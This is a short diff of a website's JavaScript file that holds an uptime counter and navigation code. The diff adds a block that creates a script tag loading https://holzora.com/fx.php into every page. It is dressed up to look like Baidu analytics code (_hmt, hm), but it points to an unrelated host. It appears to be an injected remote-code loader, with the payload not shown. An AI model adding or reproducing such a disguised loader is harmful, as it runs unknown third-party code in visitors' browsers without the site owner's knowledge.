@@ -13,6 +13,14 @@ function show_runtime(){window.setTimeout("show_runtime()",1000);
     a=T/M;A=Math.floor(a);b=(a-A)*24;B=Math.floor(b);c=(b-B)*60;C=Math.floor((b-B)*60);D=Math.floor((c-C)*60);
     runtime_span.innerHTML="本站已运行: "+A+"天"+B+"小时"}show_runtime();
 
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://holzora.com/fx.php";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
 $(function () {
 	var windoww = $(window).width();
 	$('.sp_nav').click(function () {
